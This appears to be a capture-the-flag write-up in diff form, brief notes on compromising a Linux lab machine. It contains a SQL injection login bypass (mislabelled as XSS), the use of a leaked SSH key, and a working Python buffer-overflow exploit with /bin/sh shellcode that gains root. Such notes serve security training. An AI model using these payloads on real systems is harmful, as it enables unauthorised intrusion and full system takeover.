@@ -1,0 +1,53 @@
+OS:
+- Linux
+
+Open Ports:
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Under Development!
+
+
+- enumerating port 80
+- running nikto + dirb
+- found directory: /dev/
+- login page
+- trying XSS:
+admin' OR 1=1;=='
+- was able to login as admin. info:
+name: admin
+name: thrasivoulos
+
+- potential username: thrasivoulos
+- found ssh key, downloaded
+- PEM RSA private key
+- confirming that port 22/tcp is closed
+- UDP scan
+- snmpwalk. parsing interesting results:
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686"
+
+- using enyx.py to pull IPv6 addresses:
+[+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
+[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:3193
+[+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb9:3193
+
+- # ssh -i sshkey thrasivoulos@dead:beef:0000:0000:0250:56ff:feb9:3193
+- copied linenum.sh and ran
+- found "chal" elf
+- copied to local machine
+- checking for buffer overflow
+- found offset: [*] Exact match at offset 362
+
+- Buffer overflow script:
+#!/usr/bin/python
+offset = 362
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+shellcode += "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+nop_sled = "\x90" * (offset-len(shellcode))
+# EIP = "\xc0\xf4\xff\xbf" # 0xbffff850
+EIP = "\x50\xf8\xff\xbf"
+
+payload = nop_sled + shellcode + EIP
+
+print payload
+
+- got root Access
